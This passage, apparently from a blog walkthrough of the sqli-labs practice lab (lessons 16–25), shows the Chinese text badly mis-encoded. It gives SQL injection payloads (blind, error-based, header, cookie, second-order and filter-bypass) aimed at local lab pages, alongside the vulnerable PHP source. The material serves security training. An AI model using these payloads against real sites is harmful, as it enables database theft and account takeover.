(åŸºäºboolå‹&#x2F;æ—¶é—´å»¶è¿Ÿçš„åŒå¼•å·POSTå‹ç›²æ³¨)"></a>Less-16 POST - Blind- Boolian&#x2F;Time Based - Double quotes (åŸºäºboolå‹&#x2F;æ—¶é—´å»¶è¿Ÿçš„åŒå¼•å·POSTå‹ç›²æ³¨)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-13"><a href="#æ‰‹åŠ¨æ³¨å…¥-13" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>ä½¿ç”¨å»¶æ—¶æ³¨å…¥ï¼Œæ­£ç¡®ç›´æ¥ç™»å½•æˆåŠŸï¼Œå¦åˆ™å»¶æ—¶5sã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=admin&quot;)<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))<span class="comment">#&amp;passwd=11&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-14"><a href="#æºç åˆ†æ-14" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-17-POST-Update-Query-Error-Based-String-åŸºäºé”™è¯¯çš„æ›´æ–°æŸ¥è¯¢POSTæ³¨å…¥"><a href="#Less-17-POST-Update-Query-Error-Based-String-åŸºäºé”™è¯¯çš„æ›´æ–°æŸ¥è¯¢POSTæ³¨å…¥" class="headerlink" title="Less-17 POST - Update Query- Error Based - String (åŸºäºé”™è¯¯çš„æ›´æ–°æŸ¥è¯¢POSTæ³¨å…¥)"></a>Less-17 POST - Update Query- Error Based - String (åŸºäºé”™è¯¯çš„æ›´æ–°æŸ¥è¯¢POSTæ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-14"><a href="#æ‰‹åŠ¨æ³¨å…¥-14" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŠ¥é”™æ³¨å…¥</span></span><br><span class="line">uname=admin&amp;passwd=11&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e))<span class="comment">#&amp;submit=Submit</span></span><br><span class="line"><span class="comment">#å»¶æ—¶æ³¨å…¥</span></span><br><span class="line">uname=admin&amp;passwd=<span class="number">11</span><span class="string">&#x27;and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-15"><a href="#æºç åˆ†æ-15" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>åœ¨<code>less-17</code>çš„<code>check_input()</code>ä¸­ï¼Œå¯¹ username è¿›è¡Œå„ç§è½¬ä¹‰çš„å¤„ç†ï¼Œæ‰€ä»¥æ­¤å¤„ä¸èƒ½ä½¿ç”¨usernameè¿›è¡Œæ³¨å…¥ã€‚</p><h4 id="å‡½æ•°ç®€ä»‹"><a href="#å‡½æ•°ç®€ä»‹" class="headerlink" title="å‡½æ•°ç®€ä»‹"></a>å‡½æ•°ç®€ä»‹</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>() <span class="comment">#å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ï¼Œå¦‚å•å¼•å·ï¼ˆ&#x27;ï¼‰ï¼ŒåŒå¼•å·ï¼ˆ&quot;ï¼‰ï¼Œåæ–œæ ï¼ˆ\ï¼‰ï¼ŒNULLã€‚</span></span><br><span class="line"><span class="title function_ invoke__">stripslashes</span>() <span class="comment">#å‡½æ•°åˆ é™¤ç”± addslashes() å‡½æ•°æ·»åŠ çš„åæ–œæ ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">mysql_real_escape_string</span>() <span class="comment">#å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦,å¦‚\x00ï¼Œ\nï¼Œ\rï¼Œ\ï¼Œ&#x27;ï¼Œ&quot;ï¼Œ\x1aã€‚</span></span><br></pre></td></tr></table></figure><h3 id="Less-18-POST-Header-Injection-Uagent-field-Error-based-åŸºäºé”™è¯¯çš„ç”¨æˆ·ä»£ç†ï¼Œå¤´éƒ¨POSTæ³¨å…¥"><a href="#Less-18-POST-Header-Injection-Uagent-field-Error-based-åŸºäºé”™è¯¯çš„ç”¨æˆ·ä»£ç†ï¼Œå¤´éƒ¨POSTæ³¨å…¥" class="headerlink" title="Less-18 POST - Header Injection - Uagent field - Error based (åŸºäºé”™è¯¯çš„ç”¨æˆ·ä»£ç†ï¼Œå¤´éƒ¨POSTæ³¨å…¥)"></a>Less-18 POST - Header Injection - Uagent field - Error based (åŸºäºé”™è¯¯çš„ç”¨æˆ·ä»£ç†ï¼Œå¤´éƒ¨POSTæ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-15"><a href="#æ‰‹åŠ¨æ³¨å…¥-15" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>åˆ©ç”¨æŠ“åŒ…å·¥å…·ä¿®æ”¹<code>user-agent</code>å³å¯</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e)) and <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/HklOqKTNYZFoMuD.png" alt="18_2.png"></p><h4 id="æºç åˆ†æ-16"><a href="#æºç åˆ†æ-16" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure><p>å¯¹ uname å’Œ passwd è¿›è¡Œäº† check_input()å‡½æ•°çš„å¤„ç†ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¾“å…¥uname å’Œpasswdä¸Šè¿›è¡Œæ³¨å…¥æ˜¯ä¸è¡Œçš„ï¼Œä½†å¯ä»¥åˆ©ç”¨insertã€‚</p><h3 id="Less-19-POST-Header-Injection-Referer-field-Error-based-åŸºäºå¤´éƒ¨çš„Referer-POSTæŠ¥é”™æ³¨å…¥"><a href="#Less-19-POST-Header-Injection-Referer-field-Error-based-åŸºäºå¤´éƒ¨çš„Referer-POSTæŠ¥é”™æ³¨å…¥" class="headerlink" title="Less-19 POST - Header Injection - Referer field - Error based (åŸºäºå¤´éƒ¨çš„Referer POSTæŠ¥é”™æ³¨å…¥)"></a>Less-19 POST - Header Injection - Referer field - Error based (åŸºäºå¤´éƒ¨çš„Referer POSTæŠ¥é”™æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-16"><a href="#æ‰‹åŠ¨æ³¨å…¥-16" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>ä¿®æ”¹<code>referer</code>å³å¯ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@basedir</span>),0x7e)) and <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-17"><a href="#æºç åˆ†æ-17" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-20-POST-Cookie-injections-Uagent-field-Error-based-åŸºäºé”™è¯¯çš„cookieå¤´éƒ¨POSTæ³¨å…¥"><a href="#Less-20-POST-Cookie-injections-Uagent-field-Error-based-åŸºäºé”™è¯¯çš„cookieå¤´éƒ¨POSTæ³¨å…¥" class="headerlink" title="Less-20 POST - Cookie injections - Uagent field - Error based (åŸºäºé”™è¯¯çš„cookieå¤´éƒ¨POSTæ³¨å…¥)"></a>Less-20 POST - Cookie injections - Uagent field - Error based (åŸºäºé”™è¯¯çš„cookieå¤´éƒ¨POSTæ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-17"><a href="#æ‰‹åŠ¨æ³¨å…¥-17" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æ·»åŠ <code>cookie</code>å³å¯</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=admin1&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@basedir</span>),0x7e))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/VdL9Es5qwCboOKx.png" alt="20.png"></p><h4 id="æºç åˆ†æ-18"><a href="#æºç åˆ†æ-18" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$cookee</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><h3 id="Less-21-Cookie-Injection-Error-Based-complex-string"><a href="#Less-21-Cookie-Injection-Error-Based-complex-string" class="headerlink" title="Less-21 Cookie Injection- Error Based- complex - string"></a>Less-21 Cookie Injection- Error Based- complex - string</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-18"><a href="#æ‰‹åŠ¨æ³¨å…¥-18" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>å¯¹<code>Cookie</code>è¿›è¡Œ<code>base64</code>ç¼–ç å³å¯</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">Cookieï¼š</span><br><span class="line">uname=YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSM=</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-19"><a href="#æºç åˆ†æ-19" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))   <span class="comment">// Quote if not a number</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$value</span>) . <span class="string">&#x27;&quot;&#x27;</span>; <span class="comment">//æ·»åŠ äº†&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><h3 id="Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-åŸºäºé”™è¯¯çš„åŒå¼•å·å­—ç¬¦å‹Cookieæ³¨å…¥"><a href="#Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-åŸºäºé”™è¯¯çš„åŒå¼•å·å­—ç¬¦å‹Cookieæ³¨å…¥" class="headerlink" title="Less-22 Cookie Injection- Error Based- Double Quotes - string (åŸºäºé”™è¯¯çš„åŒå¼•å·å­—ç¬¦å‹Cookieæ³¨å…¥)"></a>Less-22 Cookie Injection- Error Based- Double Quotes - string (åŸºäºé”™è¯¯çš„åŒå¼•å·å­—ç¬¦å‹Cookieæ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-19"><a href="#æ‰‹åŠ¨æ³¨å…¥-19" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>ä¸less-21ä¸€æ ·éœ€è¦base64ç¼–ç </p><h4 id="æºç åˆ†æ-20"><a href="#æºç åˆ†æ-20" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))   <span class="comment">// Quote if not a number</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;<span class="comment">//æ·»åŠ äº†&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><h2 id="Page-2-Advanced-Injections"><a href="#Page-2-Advanced-Injections" class="headerlink" title="Page-2 (Advanced Injections)"></a>Page-2 (Advanced Injections)</h2><h3 id="Less-23-GET-Error-based-strip-comments-åŸºäºé”™è¯¯çš„ï¼Œè¿‡æ»¤æ³¨é‡Šçš„GETå‹"><a href="#Less-23-GET-Error-based-strip-comments-åŸºäºé”™è¯¯çš„ï¼Œè¿‡æ»¤æ³¨é‡Šçš„GETå‹" class="headerlink" title="Less-23 GET - Error based - strip comments (åŸºäºé”™è¯¯çš„ï¼Œè¿‡æ»¤æ³¨é‡Šçš„GETå‹)"></a>Less-23 GET - Error based - strip comments (åŸºäºé”™è¯¯çš„ï¼Œè¿‡æ»¤æ³¨é‡Šçš„GETå‹)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-20"><a href="#æ‰‹åŠ¨æ³¨å…¥-20" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è·å–è·¯å¾„</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,@<span class="variable">@basedir</span>,<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#è·å–æ•°æ®åº“å</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(schema_name) from information_schema.schemata),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#è·å–securityä¸­æ‰€æœ‰è¡¨å</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#è·å–usersä¸­æ‰€æœ‰åˆ—å</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#è·å–usersä¸­usernameè¿™ä¸€åˆ—å†…å®¹</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(username) from security.users limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#è·å–usersä¸­passwordè¿™ä¸€åˆ—å†…å®¹</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(password) from security.users limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#æŠ¥é”™æ³¨å…¥è·å–æ•°æ®åº“å</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=1&#x27;</span>or extractvalue(<span class="number">1</span>,concat(0x7e,database())) or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-21"><a href="#æºç åˆ†æ-21" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†<code>#</code>å’Œ<code>--</code>è¿™ä¸¤ç§æ³¨é‡Šç¬¦å·ã€‚</p><h3 id="Less-24-Second-Degree-Injections-Real-treat-Store-Injections-äºŒæ¬¡æ³¨å…¥"><a href="#Less-24-Second-Degree-Injections-Real-treat-Store-Injections-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="Less - 24 Second Degree Injections Real treat -Store Injections (äºŒæ¬¡æ³¨å…¥)"></a>Less - 24 Second Degree Injections Real treat -Store Injections (äºŒæ¬¡æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-21"><a href="#æ‰‹åŠ¨æ³¨å…¥-21" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æ³¨å†Œä¸€ä¸ªè´¦å·ä¸º<code>admin&#39;#</code>çš„è´¦æˆ·</p><p><img src="https://s2.loli.net/2022/05/17/DHwAEfZskga84Cb.png" alt="24_1.png"></p><p>æ³¨å†ŒæˆåŠŸååœ¨åå°å¯ä»¥çœ‹åˆ°ä¿¡æ¯</p><p><img src="https://s2.loli.net/2022/05/17/r3VvX1DF96auLeI.png" alt="24_2.png"></p><p>ç”¨åˆšæ³¨å†Œçš„è´¦å·ç™»å½•å¹¶ä¿®æ”¹å¯†ç å³å¯æ›´æ”¹<code>admin</code>çš„å¯†ç </p><p><img src="https://s2.loli.net/2022/05/17/vnFTACyI8aXpM9J.png" alt="24_3.png"></p><h4 id="æºç åˆ†æ-22"><a href="#æºç åˆ†æ-22" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-25-Trick-with-OR-amp-AND-è¿‡æ»¤äº†orå’Œand"><a href="#Less-25-Trick-with-OR-amp-AND-è¿‡æ»¤äº†orå’Œand" class="headerlink" title="Less-25 Trick with OR &amp; AND (è¿‡æ»¤äº†orå’Œand)"></a>Less-25 Trick with OR &amp; AND (è¿‡æ»¤äº†orå’Œand)</h3><h4 id="ç»•è¿‡orå’Œandè¿‡æ»¤"><a href="#ç»•è¿‡orå’Œandè¿‡æ»¤" class="headerlink" title="ç»•è¿‡orå’Œandè¿‡æ»¤"></a>ç»•è¿‡orå’Œandè¿‡æ»¤</h4><p>ï¼ˆ1ï¼‰å¤§å°å†™å˜å½¢ Or,OR,oR </p><p>ï¼ˆ2ï¼‰ç¼–ç ï¼Œhexï¼Œurlencode </p><p>ï¼ˆ3ï¼‰æ·»åŠ æ³¨é‡Š&#x2F;*or*&#x2F; </p><p>ï¼ˆ4ï¼‰åˆ©ç”¨ç¬¦å· and&#x3D;&amp;&amp; or&#x3D;||</p><h4 id="æ‰‹åŠ¨æ³¨å…¥-22"><a href="#æ‰‹åŠ¨æ³¨å…¥-22" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-25/?id=1&#x27;||1=1--+ </span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-25/?id=1&#x27;<span class="attribute">OOrr</span> <span class="number">1</span>=<span class="number">1</span>--+ </span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-23"><a href="#æºç åˆ†æ-23" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span 